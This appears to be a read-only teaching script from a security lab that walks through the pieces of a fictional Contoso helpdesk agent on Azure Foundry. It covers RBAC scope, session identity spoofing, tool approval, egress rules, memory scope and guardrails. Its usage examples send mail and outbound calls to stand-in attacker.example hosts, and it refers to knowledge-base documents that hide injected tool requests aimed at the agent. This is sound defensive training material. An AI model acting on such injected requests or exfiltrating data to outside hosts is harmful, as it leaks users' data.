"""
explore.py: look at each Foundry piece of the Helpdesk hosted agent on its own, before you attack it (AZ14 lab,
README Step 1b).

Read-only. Nothing here changes a file, starts a program or uses the network. Every command reads the lab's JSON files
and asks the offline twin (twin.py, policy.py) what Foundry and your agent's code would do. Pick a setup: contoso
(version 1), v1.1 (what a demo review fixes) or fixes (the hardened build).

    python3 explore.py map fixes                       # 1. the Foundry pieces, and what this setup does with each
    python3 explore.py token bob                       # 2. the claims in Bob's Microsoft Entra access token
    python3 explore.py invoke contoso carol helpdesk-admin-agent
                                                       # 3. may this user call this agent's endpoint? (RBAC scope)
    python3 explore.py session contoso bob --header alice
                                                       # 4. whose session a request lands in (x-ms-user-identity)
    python3 explore.py identity contoso                # 5. the agent identity's roles, and what it can touch
    python3 explore.py tools contoso                   # 6. the toolbox: tools, require_approval, whose credential
    python3 explore.py policy fixes bob send_email '{"to": "collect@attacker.example"}'
                                                       # 7. what YOUR code checks before a tool call runs
    python3 explore.py egress v1.1 https://collect.attacker.example/c
                                                       # 8. the egress rules, in order, for one outbound call
    python3 explore.py memory contoso bob              # 9. the memory scope a user's memories go under
    python3 explore.py sandbox contoso bob             # 10. which uploaded files Code Interpreter shows this user
    python3 explore.py guardrail contoso               # 11. which guardrail (RAI policy) the agent points at
    python3 explore.py logs contoso                    # 12. who may read the traces, and one execute_tool span
    python3 explore.py turn contoso bob "VPN client certificate renewal"
                                                       # 13. one request to the agent, step by step (in memory only)

Everything is fake: Contoso is Microsoft's documentation placeholder, the subscription is all zeros, object IDs are
lab placeholders. twin.py is a teaching model, not Azure; its docstring and the README cite the Microsoft page for each
rule.
"""

from __future__ import annotations

import argparse
import json
import os
import textwrap

import policy
import twin

HERE = os.path.dirname(os.path.abspath(__file__))
SETUPS = ("contoso", "v1.1", "fixes")
TENANT = "<tenant-id>"


def short_scope(scope: str) -> str:
    """The last two parts of an Azure resource ID: enough to see how wide a role assignment reaches."""
    parts = scope.strip("/").split("/")
    if "containers" in parts:
        return f"container {parts[-1]}"
    if "agents" in parts:
        return f"agent {parts[-1]}"
    if "projects" in parts:
        return f"project {parts[-1]} (every agent in it)"
    kind = parts[-2] if len(parts) >= 2 else ""
    name = parts[-1]
    if kind == "accounts":
        return f"Foundry account {name} (every project and agent in it)"
    if kind == "storageAccounts":
        return f"storage account {name} (every container in it)"
    if kind == "registries":
        return f"registry {name}"
    return name


def table(rows: list[tuple[str, str, str]], heads: tuple[str, str, str], width: int = 60) -> None:
    w0 = max(len(heads[0]), *(len(r[0]) for r in rows))
    w1 = max(len(heads[1]), *(len(r[1]) for r in rows))
    print(f"  {heads[0]:<{w0}}  {heads[1]:<{w1}}  {heads[2]}")
    for a, b, c in rows:
        lines = textwrap.wrap(c, width) or [""]
        print(f"  {a:<{w0}}  {b:<{w1}}  {lines[0]}")
        for more in lines[1:]:
            print(" " * (w0 + w1 + 6) + more)


# ---------------------------------------------------------------- 1. map

def cmd_map(a) -> None:
    cfg = twin.setup(a.setup)
    d = cfg["deployment"]
    ag = twin.agent(cfg)
    df = ag["definition"]
    consumers = [f"{ra['principal']} on {short_scope(ra['scope'])}" for ra in cfg["identity"]["role_assignments"]
                 if ra["role"] == "Foundry Agent Consumer"]
    roles = [f"{ra['role']} on {short_scope(ra['scope'])}" for ra in twin.agent_roles(cfg)]
    rai = twin.rai_policy_exists(cfg)
    rai_txt = {None: "no rai_config: no guardrail", False: "names a policy that doesn't exist: filters nothing",
               True: "an existing policy: applied"}[rai]
    eg = ag["egressPolicy"]
    eg_txt = "none" if not eg else f"mode {eg['mode']}, default {eg['defaultAction']}, {len(eg['rules'])} allow rules"
    tb = cfg["toolbox"]
    mcp = [t for t in twin.toolbox_tools(cfg) if t["type"] == "mcp"]
    tb_txt = (f"{tb['name']} v{tb['default_version']}: " +
              ", ".join(f"MCP {t['server_label']} (require_approval {t['require_approval']})" for t in mcp) +
              (", Code Interpreter" if any(t["type"] == "code_interpreter" for t in twin.toolbox_tools(cfg)) else ""))
    rt = ag["runtime"]
    mem = cfg["memory"]
    rows = [
        ("Hosted agent", "your code in a container; a sandbox per session",
         f"{df['container_configuration']['image'].split('/')[-1]}, {df['cpu']} vCPU / {df['memory']}, "
         f"idle timeout {ag['idle_timeout_minutes']} min"),
        ("Endpoint access", "who may call the agent", "; ".join(consumers)),
        ("Sessions", "whose conversation a call resumes",
         f"x-ms-user-identity from {cfg['app']['user_identity_from'].replace('_', ' ')}"),
        ("Agent identity", "what the agent itself may touch", "; ".join(roles) or "no roles"),
        ("Toolbox", "one MCP endpoint for the tools", tb_txt),
        ("Your runtime", "checks your code runs before a tool call",
         f"policy check {'on' if rt['policy_check'] else 'off'}; approval enforced "
         f"{'by your code' if rt['approval_enforcement'] == 'runtime' else 'by nobody'}; local tools "
         f"{', '.join(rt['local_tools']) or 'none'}"),
        ("Egress", "where the sandbox may connect", eg_txt),
        ("Memory (preview)", "what the agent remembers, per scope",
         f"scope {mem['tool']['scope']}; ttl {mem['options']['default_ttl_seconds'] or 'none'}; "
         f"write filter {'on' if mem['write_filter'] else 'off'}"),
        ("Guardrail", "content filter on prompts and answers", rai_txt),
        ("Tracing", "the record of what happened",
         f"Application Insights {'on' if d['tracing']['application_insights'] else 'off'}; readers "
         f"{', '.join(d['tracing']['trace_readers'])}"),
    ]
    print(f"The TSG Helpdesk as a Foundry hosted agent, setup: {a.setup}   (fictional Contoso, "
          f"account {d['foundry_account']['name']}, project {d['project']['name']})\n")
    table(rows, ("piece", "its job", "what this setup has"))


# ---------------------------------------------------------------- 2. token

def cmd_token(a) -> None:
    u = twin.user(a.user)
    claims = [
        ("iss", f"https://login.microsoftonline.com/{TENANT}/v2.0", "issuer: who signed it (Contoso's tenant)"),
        ("aud", "api://helpdesk-web", "audience: which API the token is for; check it"),
        ("tid", TENANT, "tenant ID: which organisation the user signed in to"),
        ("oid", u["oid"], "object ID: the user's fixed ID in this tenant (use this one)"),
        ("preferred_username", u["upn"], "display only: Microsoft says it can change"),
        ("scp", "Helpdesk.Chat", "what the front end may do for the user"),
        ("groups", ", ".join(u["groups"]), "group memberships (names here; real tokens carry IDs)"),
    ]
    print(f"What Microsoft Entra ID puts in {a.user}'s access token for helpdesk-web (a real one is a signed JWT):\n")
    w = max(len(c[1]) for c in claims)
    for k, v, why in claims:
        print(f"  {k:<18} {v:<{w}}   {why}")
    print("\n=> Your front end validates this token. The oid in it is what x-ms-user-identity should carry (step 4).")


# ---------------------------------------------------------------- 3. invoke

def cmd_invoke(a) -> None:
    cfg = twin.setup(a.setup)
    target = twin.agent_resource(cfg, a.agent)
    groups = twin.user(a.user)["groups"]
    print(f"{a.user} (groups: {', '.join(groups)}) calls the endpoint of {a.agent}")
    print(f"  the endpoint's resource: .../accounts/{cfg['deployment']['foundry_account']['name']}/projects/"
          f"{cfg['deployment']['project']['name']}/agents/{a.agent}\n")
    print("  Foundry Agent Consumer role assignments:")
    for ra in cfg["identity"]["role_assignments"]:
        if ra["role"] != "Foundry Agent Consumer":
            continue
        p = ra["principal"]
        mine = (p.startswith("group:") and p[6:] in groups) or p == f"user:{a.user}"
        covers = twin.scope_covers(ra["scope"], target)
        verdict = ("applies: covers this agent" if mine and covers else
                   "your group, but not this agent" if mine else "not you")
        print(f"    {p:<22} on {short_scope(ra['scope']):<44} {verdict}")
    ok = twin.can_invoke(cfg, a.user, a.agent)
    print()
    print(f"=> {'200: the call goes through' if ok else '403: no Foundry Agent Consumer role covers this agent'}")
    if ok:
        print("   A role at account or project scope covers EVERY agent below it, admin agents included.")


# ---------------------------------------------------------------- 4. session

def cmd_session(a) -> None:
    cfg = twin.setup(a.setup)
    src = cfg["app"]["user_identity_from"]
    eff = twin.effective_user(cfg, a.user, a.header)
    print(f"  signed in (validated Entra token)   {a.user}  (oid {twin.user(a.user)['oid']})")
    print(f"  the browser also sent                {('user = ' + a.header) if a.header else 'nothing extra'}")
    print(f"  this front end takes the user from   {src.replace('_', ' ')}"
          + ("  (whatever the browser says)" if src == "request_header" else "  (the browser can't change it)"))
    print(f"  x-ms-user-identity sent to Foundry   {twin.user(eff)['oid']}  ({eff})")
    sessions = twin.read_session(cfg, eff)
    print(f"  sessions this request can resume     {len(sessions)}")
    for s in sessions:
        print(f"      {s}")
    print()
    print("=> Foundry treats x-ms-user-identity as an opaque string and scopes the session to it.")
    if eff != a.user:
        print(f"   {a.user} is now in {eff}'s session. Microsoft: derive it server-side, never from the client.")
    else:
        print(f"   {a.user} gets {a.user}'s own sessions only.")


# ---------------------------------------------------------------- 5. identity

def cmd_identity(a) -> None:
    cfg = twin.setup(a.setup)
    print("The hosted agent runs as its own agent identity (a special service principal in Microsoft Entra ID).")
    print("It starts with no permissions; these are the roles someone gave it:\n")
    for ra in twin.agent_roles(cfg):
        print(f"  {ra['role']:<30} on {short_scope(ra['scope'])}")
    print("\n  what that lets the agent do in storage account "
          f"{twin.DIRECTORY['storage']['account']}:")
    for c in twin.DIRECTORY["storage"]["containers"]:
        r = "read" if twin.storage_allowed(cfg, c, write=False) else "no read"
        w = "write/delete" if twin.storage_allowed(cfg, c, write=True) else "no write"
        print(f"    container {c:<11} {r:<8} {w}")
    print("\n=> Whatever the agent identity may do, any text the agent reads can ask it to do (lesson 14.3).")


# ---------------------------------------------------------------- 6. tools

def cmd_tools(a) -> None:
    cfg = twin.setup(a.setup)
    tb = cfg["toolbox"]
    print(f"Toolbox {tb['name']}, default_version {tb['default_version']} (the version the MCP endpoint serves)\n")
    for t in twin.toolbox_tools(cfg):
        if t["type"] != "mcp":
            print(f"  {t['type']}: offered through the toolbox")
            continue
        conn = tb["connections"][t["project_connection_id"]]
        who = "each signed-in user" if conn["credential_owner"] == "per-user" else conn["credential_owner"]
        print(f"  MCP server {t['server_label']}  {t['server_url']}")
        print(f"    allowed_tools     {t.get('allowed_tools') or 'not set: every tool the server offers'}")
        print(f"    require_approval  {t['require_approval']}  (returned in _meta.tool_configuration on tools/list)")
        print(f"    connection        {t['project_connection_id']}, authType {conn['authType']}: calls run as {who}")
    rt = twin.agent(cfg)["runtime"]
    print("\n  tools the model sees this turn:")
    for name, (kind, source, _) in twin.offered_tools(cfg).items():
        print(f"    {name:<15} {kind:<6} from {source}")
    print("\n=> Microsoft: \"The MCP endpoint doesn't block tools/call. Enforcement is entirely the agent runtime's")
    print("   responsibility.\" In a hosted agent the runtime is your code: approval enforced here = "
          + ("yes" if rt["approval_enforcement"] == "runtime" else "NO"))


# ---------------------------------------------------------------- 7. policy

def cmd_policy(a) -> None:
    cfg = twin.setup(a.setup)
    args = json.loads(a.args)
    rt = twin.agent(cfg)["runtime"]
    tools = twin.offered_tools(cfg)
    upn = twin.user(a.user)["upn"]
    print(f"  tool call   {a.tool}({json.dumps(args)})   proposed by the model for {upn}")
    if a.tool not in tools:
        print(f"  offered?    no: {a.tool} isn't in this setup's tool list, so the model can't call it")
        print("\n=> refused before anything runs")
        return
    kind, source, tdef = tools[a.tool]
    print(f"  offered?    yes, a {kind} tool from {source}")
    verdict = "runs"
    if rt["policy_check"]:
        ok, why = policy.check(a.tool, args, upn)
        print(f"  1. policy.check (your code, no model)   {'allow' if ok else 'DENY'}: {why}")
        if not ok:
            verdict = "REFUSED by your policy check"
    else:
        print("  1. policy.check (your code, no model)   not called in this setup")
    if verdict == "runs" and source == "toolbox":
        meta = tdef.get("require_approval", "always")
        if rt["approval_enforcement"] == "none":
            print(f"  2. approval                            require_approval {meta}, but this runtime ignores it")
        elif meta == "always" or kind == "write":
            print(f"  2. approval                            require_approval {meta}: a person must say yes first")
            verdict = "waits for a person's approval"
    elif verdict == "runs":
        print("  2. approval                            a local tool: no toolbox flag at all")
    if verdict == "runs" and a.tool == "http_get":
        ok, why = twin.egress(cfg, args.get("url", ""), [])
        print(f"  3. egress                              {why}")
        if not ok:
            verdict = "REFUSED by egress (HTTP 403)"
    print(f"\n=> {verdict}")


# ---------------------------------------------------------------- 8. egress

def cmd_egress(a) -> None:
    cfg = twin.setup(a.setup)
    pol = twin.agent(cfg)["egressPolicy"]
    host = twin.host_of(a.url)
    print(f"  outbound call from the agent's sandbox to host {host}")
    if not pol:
        print("  egress policy   none: every host is reachable")
        print("\n=> allowed")
        return
    print(f"  egress policy   mode {pol['mode']}, defaultAction {pol['defaultAction']}   (preview; in Azure it sits in the RAI policy)")
    hit = None
    for i, r in enumerate(pol["rules"], 1):
        m = twin.host_matches(r["match"]["host"], host)
        print(f"    rule {i} {r['name']:<14} host {r['match']['host']:<22} {r['action']['actionType']:<6} "
              f"{'MATCHES (first match wins)' if m and hit is None else 'no match' if not m else 'not reached'}")
        if m and hit is None:
            hit = r
    if hit is None:
        print(f"    no rule matched: defaultAction {pol['defaultAction']}")
    ok, why = twin.egress(cfg, a.url, [])
    print(f"\n=> {why}")


# ---------------------------------------------------------------- 9. memory

def cmd_memory(a) -> None:
    cfg = twin.setup(a.setup)
    m = cfg["memory"]
    mem = twin.Memory(cfg)
    print(f"  memory store {m['store']}, tool scope \"{m['tool']['scope']}\"")
    print(f"  for {a.user}: memories go under scope {mem.scope_for(a.user)}")
    others = {u: mem.scope_for(u) for u in ("alice", "bob", "dana")}
    shared = len(set(others.values())) == 1
    print("  alice, bob, dana: " + ", ".join(others.values())
          + ("   <- one shared shelf" if shared else "   <- one shelf each"))
    o = m["options"]
    onoff = {True: "on", False: "off"}
    print(f"  extracted: user profile {onoff[o['user_profile_enabled']]}, chat summary "
          f"{onoff[o['chat_summary_enabled']]}, procedural {onoff[o['procedural_memory_enabled']]}")
    print(f"  default_ttl_seconds {o['default_ttl_seconds'] or 'not set (no expiry)'}; "
          f"your write filter {'on' if m['write_filter'] else 'off'}")
    print("\n=> Microsoft: set scope to {{$userId}} \"to enable per-user memory isolation\".")


# ---------------------------------------------------------------- 10. sandbox

def cmd_sandbox(a) -> None:
    cfg = twin.setup(a.setup)
    via_toolbox = any(t["type"] == "code_interpreter" for t in twin.toolbox_tools(cfg))
    print(f"  Code Interpreter in this setup: {'through the toolbox' if via_toolbox else 'not offered'}")
    files = twin.code_interpreter_files(cfg, a.user)
    ups = {k: v for k, v in twin.DIRECTORY["uploads"].items() if k != "_about"}
    print(f"  files uploaded today: " + ", ".join(f"{v['name']} (by {k})" for k, v in ups.items()))
    print(f"  what {a.user} sees in /mnt/data: {len(files)} file(s)")
    for f in files:
        print(f"      {f.splitlines()[-1]}")
    print("\n=> Microsoft: through a toolbox in a hosted agent \"user isolation isn't supported. All users in the")
    print("   same project share the same container context.\"")


# ---------------------------------------------------------------- 11. guardrail

def cmd_guardrail(a) -> None:
    cfg = twin.setup(a.setup)
    rc = twin.agent(cfg)["definition"].get("rai_config")
    name = (rc or {}).get("rai_policy_name", "")
    print(f"  rai_config.rai_policy_name   .../accounts/{name.split('/accounts/')[-1]}" if rc else "  rai_config   not set")
    print(f"  RAI policies on the account  {', '.join(cfg['deployment']['rai_policies'])}")
    ex = twin.rai_policy_exists(cfg)
    print("  does the named policy exist? " + {None: "no guardrail at all", False: "NO", True: "yes"}[ex])
    blocked = twin.guardrail_blocks_input(cfg, twin.PROMPT_ATTACK)
    at_input = 'HTTP 400 "code": "content_filter"' if blocked else "reaches the agent"
    print(f"  a prompt attack at the input  {at_input}")
    if ex is False:
        print("\n=> Microsoft: such an agent \"is created successfully and reports active, but no content filtering")
        print("   is applied\". The agent reports active; nothing is filtered.")


# ---------------------------------------------------------------- 12. logs

def cmd_logs(a) -> None:
    cfg = twin.setup(a.setup)
    tr = cfg["deployment"]["tracing"]
    print(f"  Application Insights tracing   {'on' if tr['application_insights'] else 'off'}")
    print(f"  who may read the traces        {', '.join(tr['trace_readers'])}")
    print("  span names                     invoke_agent (one request), execute_tool (one tool call)\n")
    with open(os.path.join(HERE, "logs", "helpdesk-traces.jsonl"), encoding="utf-8") as f:
        spans = [json.loads(line) for line in f if line.strip()]
    pick = next(s for s in spans if s.get("span") == "execute_tool" and s.get("tool") == "send_email")
    print(f"  one execute_tool span from the sample day ({len(spans)} spans and events):")
    for k, v in pick.items():
        print(f"    {k:<28} {v if isinstance(v, str) else json.dumps(v)}")
    print("\n=> Tool arguments and results are IN the trace, so the readers list is an access decision.")


# ---------------------------------------------------------------- 13. turn

def cmd_turn(a) -> None:
    cfg = twin.setup(a.setup)
    trace: list = []
    r = twin.run_turn(cfg, a.user, a.ask, header=a.header, trace=trace)
    print(f"Q ({a.user}): {a.ask}")
    print(f"   . endpoint: HTTP {r['status']}" + (" (Foundry Agent Consumer covers helpdesk-agent)" if r["status"] == 200
                                                  else ""))
    for n in r["notes"]:
        print(f"   . {n}")
    if r["status"] != 200:
        return
    eff = twin.effective_user(cfg, a.user, a.header)
    print(f"   . session and memory for: {eff}" + ("" if eff == a.user else "  <- not the signed-in user"))
    for x in r["session"]:
        print(f"   . resumed session holds: {x}")
    for d in r["docs"]:
        hidden = bool(twin.TOOL_MARK.search(twin.DOCS[d]["text"]))
        print(f"   . read {d} from container kb as the agent identity"
              + ("; it hides a tool request (a lab placeholder)" if hidden else ""))
    for t in trace:
        why = "the user asked" if t["source"] == "user" else f"from {t['source'].split(':')[-1]}"
        if t["name"] == "policy_deny":
            print(f"   . {t['tool']}({json.dumps(t['args'])}) REFUSED by policy.check  [{why}]")
        elif t["name"] == "approval":
            print(f"   . {t['tool']}: the reviewer {'approved' if t['approve'] else 'rejected'} it  [{why}]")
        elif t["name"] == "execute_tool":
            print(f"   . {t['gen_ai.tool.name']}({t['gen_ai.tool.call.arguments']}) "
                  f"{'EXECUTED' if t['ok'] else 'FAILED'}  [{why}]")
    for x in r["executed"]:
        print(f"     result: {x}")
    print(f"A: {r['answer']}")


def main() -> None:
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    sub = ap.add_subparsers(dest="cmd", required=True)
    users = sorted(twin.DIRECTORY["users"])
    agents = sorted(twin.DIRECTORY["agents"])

    def add(name, fn, *extra):
        p = sub.add_parser(name)
        if name != "token":
            p.add_argument("setup", choices=SETUPS)
        for e in extra:
            e(p)
        p.set_defaults(fn=fn)
        return p

    add("map", cmd_map)
    add("token", cmd_token, lambda p: p.add_argument("user", choices=users))
    add("invoke", cmd_invoke, lambda p: p.add_argument("user", choices=users),
        lambda p: p.add_argument("agent", choices=agents))
    add("session", cmd_session, lambda p: p.add_argument("user", choices=users),
        lambda p: p.add_argument("--header", choices=users, help="the user the browser claims to be"))
    add("identity", cmd_identity)
    add("tools", cmd_tools)
    add("policy", cmd_policy, lambda p: p.add_argument("user", choices=users), lambda p: p.add_argument("tool"),
        lambda p: p.add_argument("args", nargs="?", default="{}"))
    add("egress", cmd_egress, lambda p: p.add_argument("url"))
    add("memory", cmd_memory, lambda p: p.add_argument("user", choices=users))
    add("sandbox", cmd_sandbox, lambda p: p.add_argument("user", choices=users))
    add("guardrail", cmd_guardrail)
    add("logs", cmd_logs)
    add("turn", cmd_turn, lambda p: p.add_argument("user", choices=users), lambda p: p.add_argument("ask"),
        lambda p: p.add_argument("--header", choices=users, help="the user the browser claims to be"))
    a = ap.parse_args()
    a.fn(a)


if __name__ == "__main__":
    main()
